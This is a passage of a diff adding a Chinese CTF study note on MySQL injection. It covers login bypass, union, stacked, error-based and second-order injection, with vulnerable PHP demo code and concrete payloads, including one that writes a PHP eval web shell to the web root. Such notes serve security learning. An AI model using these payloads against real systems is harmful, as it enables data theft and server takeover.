+select * from test.users where id=1 union SELECT (select INFO FROM INFORMATION_SCHEMA.PROCESSLIST WHERE INFO LIKE &apos;%673245283%&apos; LIMIT
+ 1),2,3;
+</code></pre>
+<p><img src="../../../../images/image-20230528210843123.png" alt="image-20230528210843123"></p>
+<h2 id="mysql&#x653B;&#x51FB;&#x624B;&#x6CD5;">Mysql&#x653B;&#x51FB;&#x624B;&#x6CD5;</h2>
+<h3 id="admin&#x767B;&#x5165;">admin&#x767B;&#x5165;</h3>
+<ul>
+<li><p>&#x4E07;&#x80FD;&#x5BC6;&#x7801;</p>
+<pre class="language-"><code class="lang-php"><span class="token comment"># &#x540E;&#x7AEF;&#x4EE3;&#x7801;Demo</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT * FROM manage WHERE user=&apos;<span class="token interpolation"><span class="token variable">$user</span></span>&apos; and passwd=&apos;<span class="token interpolation"><span class="token variable">$passwd</span></span>&apos;&quot;</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&#x767B;&#x9646;&#x6210;&#x529F;&quot;</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>&#x901A;&#x8FC7;&#x5E03;&#x5C14;&#x8FD0;&#x7B97;&#x8BA9;where&#x6052;&#x4E3A;&#x771F;</p>
+<p><img src="../../../../images/image-20230312212035948.png" alt="image-20230312212035948"></p>
+</li>
+<li><p>&#x6CE8;&#x518C;&#x8986;&#x76D6;</p>
+<blockquote>
+<p>admin (&#x6709;&#x4E2A;&#x7A7A;&#x683C;)&#x6216;&#x8005; (&#x6709;&#x4E2A;&#x7A7A;&#x683C;)admin</p>
+<p>&#x539F;&#x7406;&#xFF1A;&#x7528;&#x6237;&#x540D;&#x5B57;&#x6BB5;&#x957F;&#x5EA6;&gt;5&#xFF0C;&#x6240;&#x4EE5;&#x53EF;&#x4EE5;&#x6DFB;&#x52A0;&#x7A7A;&#x683C;&#xFF0C;&#x800C;sql&#x8BED;&#x53E5;&#x6267;&#x884C;&#x65F6;&#x4F1A;&#x5C06;&#x7A7A;&#x683C;&#x5FFD;&#x7565;&#x3002;</p>
+</blockquote>
+<p><img src="../../../../images/image-20230312210909402.png" alt="image-20230312210909402"></p>
+</li>
+<li><p>&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x6784;&#x9020;&#x4E34;&#x65F6;&#x7528;&#x6237;</p>
+<p><code>[GXYCTF2019]BabySQli</code></p>
+<pre class="language-"><code class="lang-php"><span class="token comment"># &#x540E;&#x7AEF;&#x4EE3;&#x7801;Demo</span>
+<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;SELECT * FROM manage WHERE user=&apos;<span class="token interpolation"><span class="token variable">$user</span></span>&apos;&quot;</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&apos;SQL&#x8BED;&#x53E5;&#x6709;&#x8BEF;&#xFF1A;&apos;</span><span class="token operator">.</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$users</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">mysql_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;Script language=JavaScript&gt;alert(&apos;&#x62B1;&#x6B49;&#xFF0C;&#x7528;&#x6237;&#x540D;&#x6216;&#x8005;&#x5BC6;&#x7801;&#x9519;&#x8BEF;&#x3002;&apos;);history.back();&lt;/Script&gt;&quot;</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token keyword">else</span><span class="token punctuation">{</span>
+    <span class="token variable">$passwords</span><span class="token operator">=</span><span class="token variable">$users</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;password&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">&gt;</span><span class="token variable">$passwords</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&lt;Script language=JavaScript&gt;alert(&apos;&#x62B1;&#x6B49;&#xFF0C;&#x7528;&#x6237;&#x540D;&#x6216;&#x8005;&#x5BC6;&#x7801;&#x9519;&#x8BEF;&#x3002;&apos;);history.back();&lt;/Script&gt;&quot;</span><span class="token punctuation">;</span>
+    <span class="token keyword">exit</span><span class="token punctuation">;</span>    
+<span class="token punctuation">}</span>
+<span class="token keyword">echo</span> <span class="token string double-quoted-string">&quot;&#x767B;&#x9646;&#x6210;&#x529F;&quot;</span><span class="token punctuation">;</span>
+</code></pre>
+<pre class="language-"><code class="lang-mysql">username=admin&apos; union select 1,&apos;admin&apos;,&apos;c4ca4238a0b923820dcc509a6f75849b&apos; limit 1,2--+
+
+passwd=c4ca4238a0b923820dcc509a6f75849b
+
+MD5(1)=c4ca4238a0b923820dcc509a6f75849b
+</code></pre>
+<p><img src="../../../../images/image-20230312215147770.png" alt="image-20230312215147770"></p>
+</li>
+</ul>
+<h3 id="&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x6CE8;&#x5165;">&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x6CE8;&#x5165;</h3>
+<h5 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h5>
+<p>sql&#x8BED;&#x53E5;&#x4E3A;<code>select</code>,&#x9875;&#x9762;&#x6709;&#x56DE;&#x663E;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x3002;</p>
+<pre class="language-"><code class="lang-php"><span class="token variable">$sql</span><span class="token operator">=</span><span class="token string double-quoted-string">&quot;SELECT * FROM users where id=<span class="token interpolation"><span class="token variable">$id</span></span> &quot;</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">&apos;Your Login name:&apos;</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;username&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token keyword">echo</span> <span class="token string single-quoted-string">&apos;Your Password:&apos;</span> <span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;password&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+</code></pre>
+<h5 id="payload">payload</h5>
+<p><strong>&#x5148;&#x5224;&#x65AD;&#x8868;&#x4E2D;&#x7684;&#x5217;&#x6570;</strong></p>
+<pre class="language-"><code class="lang-sql"><span class="token keyword">order</span> <span class="token keyword">by</span> x
+<span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token boolean">null</span><span class="token punctuation">,</span><span class="token boolean">null</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>
+</code></pre>
+<p>&#x8FD9;&#x91CC;&#x4F7F;&#x7528;null&#x662F;&#x56E0;&#x4E3A;&#x9700;&#x8981;&#x5339;&#x914D;&#x6570;&#x636E;&#x683C;&#x5F0F;&#xFF0C;&#x800C;null&#x662F;&#x53EF;&#x4EE5;&#x5339;&#x914D;&#x4EFB;&#x610F;&#x6570;&#x636E;&#x683C;&#x5F0F;&#x7684;</p>
+<p><strong>&#x518D;&#x5224;&#x65AD;&#x54EA;&#x4E00;&#x5217;&#x662F;&#x8F93;&#x51FA;&#x70B9;</strong></p>
+<pre class="language-"><code>&#x6BCF;&#x4E2A;&#x4F4D;&#x7F6E;&#x8F93;&#x51FA;&#x4E0D;&#x540C;&#x7684;&#x503C;&#x6765;&#x5224;&#x65AD;
+</code></pre><p><strong>&#x6700;&#x540E;&#x8FDB;&#x884C;&#x6CE8;&#x5165;</strong></p>
+<pre class="language-"><code class="lang-mysql">&#x8054;&#x5408;&#x67E5;&#x8BE2;&#xFF0C;&#x83B7;&#x53D6;&#x5E93;&#x540D;
+?id=-1&quot;union select 1,2,group_concat(schema_name) from information_schema.schemata#
+
+&#x8054;&#x5408;&#x67E5;&#x8BE2;&#xFF0C;&#x83B7;&#x53D6;&#x8868;&#x540D; 
+?id=-1&quot;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&apos;&#x5DF2;&#x77E5;&#x5E93;&#x540D;&apos;#
+
+?id=-1&quot;union select 1,2,group_concat(table_name) from mysql.innodb_table_stats where database_name=&apos;&#x5DF2;&#x77E5;&#x5E93;&#x540D;&apos;#
+
+
+&#x8054;&#x5408;&#x67E5;&#x8BE2;&#xFF0C;&#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x540D;
+?id=-1&quot;union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&apos;&#x5DF2;&#x77E5;&#x8868;&#x540D;&apos;#
+
+
+&#x8054;&#x5408;&#x67E5;&#x8BE2;&#xFF0C;&#x83B7;&#x53D6;&#x5B57;&#x6BB5;&#x503C;
+?id=-1&quot;union select 1,2,group_concat(&#x5B57;&#x6BB5;1&#xFF0C;&#x5B57;&#x6BB5;2...) from &#x5DF2;&#x77E5;&#x8868;&#x540D;#
+</code></pre>
+<blockquote>
+<p>&#x6CE8;&#x610F;&#xFF1A;</p>
+<p>&#x56E0;&#x4E3A;&#x540E;&#x7AEF;&#x67E5;&#x8BE2;&#x8BED;&#x53E5;&#x53EF;&#x80FD;&#x53EA;&#x62FF;&#x7B2C;&#x4E00;&#x884C;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#x5982;<code>$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</code>&#xFF0C;&#x6240;&#x4EE5;&#x9700;&#x8981;&#x6784;&#x9020;&#x4E00;&#x4E2A;&#x4E0D;&#x5B58;&#x5728;&#x7684;&#x503C;&#x5982;-1&#xFF0C;&#x4F7F;&#x5F97;&#x8054;&#x5408;&#x67E5;&#x8BE2;&#x7684;&#x7ED3;&#x679C;&#x6210;&#x4E3A;&#x7B2C;&#x4E00;&#x884C;&#xFF1B;</p>
+<p>&#x8981;&#x67E5;&#x7684;&#x8868;&#x7684;&#x540D;&#x79F0;(&#x8FD9;&#x4E2A;&#x8868;&#x662F;&#x4E0D;&#x662F;&#x5728;&#x73B0;&#x5728;&#x4F7F;&#x7528;&#x7684;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x6CA1;&#x6709;&#x7684;&#x8BDD;&#x8868;&#x540D;=&#x6570;&#x636E;&#x5E93;.&#x8868;&#x540D;)</p>
+</blockquote>
+<h3 id="&#x5806;&#x53E0;&#x6CE8;&#x5165;">&#x5806;&#x53E0;&#x6CE8;&#x5165;</h3>
+<h5 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h5>
+<blockquote>
+<p>&#x540E;&#x7AEF;&#x4F7F;&#x7528;&#x7684;&#x67E5;&#x8BE2;&#x51FD;&#x6570;&#x4E3A;<code>mysqli_multi_query()</code> &#xFF0C;&#x652F;&#x6301;&#x591A;&#x6761;&#x8BED;&#x53E5;&#x67E5;&#x8BE2;</p>
+<p>&#x800C;&#x4E0D;&#x662F;<code>mysqli_query()</code> &#xFF0C;&#x4EC5;&#x652F;&#x6301;&#x4E00;&#x6761;&#x8BED;&#x53E5;&#x67E5;&#x8BE2;</p>
+</blockquote>
+<h5 id="&#x5C40;&#x9650;&#x6027;">&#x5C40;&#x9650;&#x6027;</h5>
+<ul>
+<li><p>&#x5E76;&#x4E0D;&#x662F;&#x6BCF;&#x4E00;&#x4E2A;&#x73AF;&#x5883;&#x4E0B;&#x90FD;&#x53EF;&#x4EE5;&#x6267;&#x884C;&#xFF0C;&#x53EF;&#x80FD;&#x53D7;&#x5230; API &#x6216;&#x8005;&#x6570;&#x636E;&#x5E93;&#x5F15;&#x64CE;&#x7684;&#x5F71;&#x54CD;</p>
+</li>
+<li><p>&#x65E0;&#x56DE;&#x663E;&#xFF1A;&#x5728; Web &#x4E2D;&#x4EE3;&#x7801;&#x901A;&#x5E38;&#x53EA;&#x8FD4;&#x56DE;&#x4E00;&#x4E2A;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;&#xFF0C;&#x56E0;&#x6B64;&#xFF0C;&#x5806;&#x53E0;&#x6CE8;&#x5165;&#x7B2C;&#x4E8C;&#x4E2A;&#x8BED;&#x53E5;&#x4EA7;&#x751F;&#x9519;&#x8BEF;&#x6216;&#x8005;&#x7ED3;&#x679C;&#x53EA;&#x80FD;&#x88AB;&#x5FFD;&#x7565;</p>
+<p><strong>&#x89E3;&#x51B3;&#x65B9;&#x6CD5;</strong>&#xFF1A;&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x5148;&#x5C06;&#x5185;&#x5BB9;&#x63D2;&#x5165;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x901A;&#x8FC7;&#x67E5;&#x8BE2;&#x67E5;&#x51FA;&#x6765;</p>
+</li>
+</ul>
+<h5 id="payload">payload</h5>
+<pre class="language-"><code class="lang-php"><span class="token operator">?</span>id<span class="token operator">=</span><span class="token number">1</span>&apos;<span class="token punctuation">;</span>sql&#x8BED;&#x53E5;<span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">+</span>
+</code></pre>
+<p>&#x53EF;&#x4EE5;&#x4EFB;&#x610F;&#x6267;&#x884C;sql&#x8BED;&#x53E5;&#xFF0C;&#x5371;&#x5BB3;&#x5F88;&#x5927;</p>
+<h6 id="&#x914D;&#x5408;handle&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x5B57;">&#x914D;&#x5408;handle&#x7ED5;&#x8FC7;&#x5173;&#x952E;&#x5B57;</h6>
+<p><a href="https://blog.csdn.net/qq_43427482/article/details/109898934" target="_blank">&#x3010;MySQL&#x3011;MySQL &#x4E4B; handler &#x7684;&#x8BE6;&#x7EC6;&#x4F7F;&#x7528;&#x53CA;&#x8BF4;&#x660E;</a></p>
+<pre class="language-"><code class="lang-mysql">handler &#x8868;&#x540D;  open ; handler &#x8868;&#x540D; read first; #&#x6253;&#x5F00;&#x8868;&#xFF1B;&#x8BFB;&#x53D6;&#x7B2C;&#x4E00;&#x6761;&#x6570;&#x636E;
+handler &#x8868;&#x540D; read next;#&#x4E0E;&#x4E0A;&#x4E00;&#x6761;&#x8BED;&#x53E5;&#x4E00;&#x8D77;&#x7528;&#xFF0C;&#x8BFB;&#x53D6;&#x4E0B;&#x4E00;&#x6761;&#x5373;&#x7B2C;&#x4E8C;&#x6761;&#x6570;&#x636E;
+</code></pre>
+<h6 id="&#x914D;&#x5408;&#x9884;&#x7F16;&#x8BD1;&#x8BED;&#x53E5;&#x7ED5;&#x8FC7;">&#x914D;&#x5408;&#x9884;&#x7F16;&#x8BD1;&#x8BED;&#x53E5;&#x7ED5;&#x8FC7;</h6>
+<p>&#x4F7F;&#x7528;&#x683C;&#x5F0F;</p>
+<pre class="language-"><code class="lang-mysql">set @tn = &apos;hahaha&apos;;  //&#x5B58;&#x50A8;&#x8868;&#x540D;
+set @sql = concat(&apos;select * from &apos;, @tn);  //&#x5B58;&#x50A8;SQL&#x8BED;&#x53E5;
+
+prepare query from @sql;   //&#x9884;&#x5B9A;&#x4E49;SQL&#x8BED;&#x53E5;
+
+execute query;  //&#x6267;&#x884C;&#x9884;&#x5B9A;&#x4E49;SQL&#x8BED;&#x53E5;
+
+(DEALLOCATE || DROP) prepare sqla;  //&#x5220;&#x9664;&#x9884;&#x5B9A;&#x4E49;SQL&#x8BED;&#x53E5;
+</code></pre>
+<h5 id="&#x4F8B;&#x9898;">&#x4F8B;&#x9898;</h5>
+<p>[SUCTF 2018]MultiSQL</p>
+<pre class="language-"><code class="lang-mysql">set @sql=select &apos;<span class="token prolog">&lt;?php eval($_POST[khaz]);?&gt;</span>&apos; into outfile &apos;/var/www/html/favicon/shell3.php&apos;;prepare name from @sql;execute name;
+</code></pre>
+<p>&#x8F6C;&#x6362;&#x811A;&#x672C;</p>
+<pre class="language-"><code class="lang-python">a <span class="token operator">=</span> <span class="token string">&quot;select &apos;&lt;?php eval($_POST[khaz]);?&gt;&apos; into outfile &apos;/var/www/html/favicon/shell3.php&apos;&quot;</span>
+b <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> a<span class="token punctuation">:</span>
+    b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+c<span class="token operator">=</span><span class="token string">&apos;,&apos;</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>b<span class="token punctuation">)</span>
+res <span class="token operator">=</span> <span class="token string">&apos;char({})&apos;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>
+</code></pre>
+<p>payload</p>
+<pre class="language-"><code class="lang-mysql">set @sql=char(117,112,100,97,116,101,32,115,99,111,114,101,32,115,101,116,32,108,105,115,116,101,110,61,50,48,48);prepare query from @sql;execute query;
+</code></pre>
+<h3 id="&#x62A5;&#x9519;&#x6CE8;&#x5165;">&#x62A5;&#x9519;&#x6CE8;&#x5165;</h3>
+<h5 id="&#x539F;&#x7406;">&#x539F;&#x7406;</h5>
+<p><strong>&#x4F7F;&#x7528;<code>mysql_error()</code>&#x51FD;&#x6570;&#xFF0C;&#x53EF;&#x4EE5;&#x8FD4;&#x56DE;&#x4E0A;&#x4E00;&#x4E2A;Mysql&#x64CD;&#x4F5C;&#x4EA7;&#x751F;&#x7684;&#x6587;&#x672C;&#x9519;&#x8BEF;&#x4FE1;&#x606F;&#x3002;</strong></p>
+<pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$con</span> <span class="token operator">=</span> <span class="token function">mysql_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;localhost&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;wrong_user&quot;</span><span class="token punctuation">,</span><span class="token string double-quoted-string">&quot;wrong_pwd&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$con</span><span class="token punctuation">)</span>
+<span class="token punctuation">{</span>
+  <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token function">mysql_error</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+<span class="token operator">&gt;&gt;</span>
+Access denied <span class="token keyword">for</span> user <span class="token string single-quoted-string">&apos;wrong_user&apos;</span>@<span class="token string single-quoted-string">&apos;localhost&apos;</span>
+<span class="token punctuation">(</span>using password<span class="token punctuation">:</span> <span class="token constant">YES</span><span class="token punctuation">)</span>
+</code></pre>
+<h5 id="&#x62A5;&#x9519;&#x51FD;&#x6570;">&#x62A5;&#x9519;&#x51FD;&#x6570;</h5>
+<p>&#x6700;&#x5E38;&#x7528;&#x7684;</p>
+<pre class="language-"><code class="lang-mysql"># Xpat&#x8BED;&#x6CD5;&#x9519;&#x8BEF;&#xFF0C;&#x62A5;&#x9519;&#x4FE1;&#x606F;&#x662F;&#x6709;&#x957F;&#x5EA6;&#x9650;&#x5236;&#x7684;&#xFF0C;&#x6700;&#x5927;&#x957F;&#x5EA6;&#x9650;&#x5236;32&#x4F4D;,&#x914D;&#x5408;substr()&#x7B49;&#x622A;&#x53D6;&#x5B57;&#x7B26;&#x4E32;&#x51FD;&#x6570;&#x4F7F;&#x7528;
+select extractvalue(1,concat(0x7e,(select user()),0x7e));
+select updatexml(1,concat(0x7e,(select user()),0x7e),1);
+</code></pre>
+<p><img src="../../../../images/image-20230523184243091.png" alt="image-20230523184243091"></p>
+<p>&#x5176;&#x4ED6;<a href="https://hatboy.github.io/2018/08/28/MySQL&#x62A5;&#x9519;&#x6CE8;&#x5165;/" target="_blank">MySQL&#x62A5;&#x9519;&#x6CE8;&#x5165; </a></p>
+<h5 id="payload">payload</h5>
+<pre class="language-"><code class="lang-mysql">&#x539F;&#x578B;&#xFF1A;
+?id=1&quot;or(updatexml(1,concat(0x7e,(),0x7e),1))--+
+
+&#x7206;&#x5E93;:
+?id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(schema_name),1,32))from (information_schema.schemata)),0x7e),1))--+
+
+
+&#x7206;&#x8868;&#xFF1A;
+id=1&quot;or(updatexml(1,concat(0x7e,(select(substr(group_concat(table_name),1,32))from (information_schema.tables)where(table_schema=&apos;&#x5DF2;&#x77E5;&#x5E93;&#x540D;&apos;)),0x7e),1))--+
+
+
+
+&#x7206;&#x5217;&#x540D;&#xFF1A;
+id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(column_name),1,32)))from(information_schema.columns)where(table_name=&apos;flag&apos;))),1))--+
+
+
+&#x7206;&#x5B57;&#x6BB5;&#x503C;
+id=1&quot;or(updatexml(1,concat(0x7e,(select( substr(group_concat(real_flag_1s_here),1,6)))from(users))),1))--+
+</code></pre>
+<h3 id="&#x4E8C;&#x6B21;&#x6CE8;&#x5165;--&#x5B58;&#x50A8;&#x578B;&#x6CE8;&#x5165;">&#x4E8C;&#x6B21;&#x6CE8;&#x5165;--&#x5B58;&#x50A8;&#x578B;&#x6CE8;&#x5165;</h3>
+<p><strong>&#x539F;&#x7406;</strong></p>
+<p><img src="../../../../images/1.png" alt="ctf1"></p>
+<p>&#x5E38;&#x89C1;&#x8F6C;&#x4E49;&#x51FD;&#x6570;</p>
+<pre class="language-"><code class="lang-php"><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>&#x4EE5;<code>sql-labs Less-24</code>&#x4E3A;&#x4F8B;</p>
+<p>&#x521B;&#x5EFA;&#x7528;&#x6237;</p>
+<pre class="language-"><code class="lang-php"><span class="token variable">$username</span><span class="token operator">=</span>  <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;username&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
+<span class="token variable">$pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;password&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token variable">$re_pass</span><span class="token operator">=</span> <span class="token function">mysql_escape_string</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;re_password&apos;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;insert into users ( username, password) values(\&quot;<span class="token interpolation"><span class="token variable">$username</span></span>\&quot;, \&quot;<span class="token interpolation"><span class="token variable">$pass</span></span>\&quot;)&quot;</span><span class="token punctuation">;</span>
+</code></pre>
+<p>&#x4F7F;&#x7528;&#x4E0D;&#x6070;&#x5F53;&#x7684;&#x51FD;&#x6570;<code>mysql_escape_string</code>&#xFF0C;&#x529F;&#x80FD;&#x4E3A;&#x5728; MySQL &#x4E2D;&#x5177;&#x6709;&#x7279;&#x6B8A;&#x542B;&#x4E49;&#x7684;&#x5B57;&#x7B26;&#xFF08;&#x5982;&#x5355;&#x5F15;&#x53F7;&#x3001;&#x53CC;&#x5F15;&#x53F7;&#x3001;&#x53CD;&#x659C;&#x6760;&#x548C;&#x7A7A;&#x5B57;&#x8282;&#xFF09;&#x524D;&#x6DFB;&#x52A0;&#x53CD;&#x659C;&#x6760;&#x5B57;&#x7B26;&#x3002;&#x6240;&#x4EE5;&#x810F;&#x6570;&#x636E;&#x8FD8;&#x662F;&#x8FDB;&#x5165;&#x5230;&#x4E86;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;</p>
+<p>&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x5904;</p>
+<pre class="language-"><code class="lang-mysql">$sql = &quot;UPDATE users SET PASSWORD=&apos;$pass&apos; where username=&apos;$username&apos; and password=&apos;$curr_pass&apos; &quot;;
+</code></pre>
+<p>&#x76F4;&#x63A5;&#x5C06;&#x810F;&#x6570;&#x636E;&#x53D6;&#x51FA;&#x5E76;&#x62FC;&#x63A5;&#x5230;sql&#x8BED;&#x53E5;&#x4E2D;&#xFF0C;&#x9020;&#x6210;&#x4E86;sql&#x6CE8;&#x5165;&#x3002;</p>
+<p><strong>&#x5E38;&#x89C1;&#x573A;&#x666F;</strong></p>
+<p>&#x5C06;&#x4FDD;&#x5B58;&#x7684;&#x810F;&#x6570;&#x636E;&#x4ECE;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x53D6;&#x51FA;&#xFF0C;&#x518D;&#x6B21;&#x8FDB;&#x884C;sql&#x64CD;&#x4F5C;&#x7684;&#x573A;&#x666F;&#x3002;</p>
+<pre class="language-"><code>&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#xFF0C;&#x4FEE;&#x6539;&#x8BA2;&#x5355;&#x7B49;&#x4FEE;&#x6539;&#x5DF2;&#x4FDD;&#x5B58;&#x4FE1;&#x606F;&#x7684;&#x5730;&#x65B9;
+&#x6CE8;&#x518C;&#x7528;&#x6237;&#x540D;&#x5904;
+</code></pre><p><strong>&#x4F8B;&#x9898;</strong></p>
+<p>[CISCN2019 &#x534E;&#x5317;&#x8D5B;&#x533A; Day1 Web5]CyberPunk</p>
+<pre class="language-"><code class="lang-php"><span class="token variable">$address</span> <span class="token operator">=</span> <span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string double-quoted-string">&quot;address&quot;</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#&#x53EF;&#x63A7;&#x53D8;&#x91CF;</span>
+
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;</span><span class="token punctuation">;</span><span class="token comment">#&#x5C06;$_POST[&quot;address&quot;]&#x4FDD;&#x5B58;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;</span>
+
+<span class="token variable">$row</span> <span class="token operator">=</span> <span class="token variable">$fetch</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#$row&#x4FDD;&#x5B58;sql&#x8BED;&#x53E5;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;</span>
+
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">&quot;update `user` set `address`=&apos;&quot;</span><span class="token operator">.</span><span class="token variable">$address</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&apos;, `old_address`=&apos;&quot;</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;address&apos;</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string double-quoted-string">&quot;&apos; where `user_id`=&quot;</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">&apos;user_id&apos;</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">#&#x8C03;&#x7528;&#x4E86;&#x67E5;&#x8BE2;&#x7ED3;&#x679C;</span>
+</code></pre>
+<p>&#x5206;&#x6790;&#x4E0A;&#x9762;&#x4E24;&#x6761;&#x8BED;&#x53E5;&#xFF0C;&#x5BF9;&#x53EF;&#x63A7;&#x53C2;&#x6570;address&#x53EA;&#x8FDB;&#x884C;&#x4E86;&#x8F6C;&#x4E49;&#x5904;&#x7406;&#xFF0C;&#x5C31;&#x4FDD;&#x5B58;&#x5230;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x3002;</p>
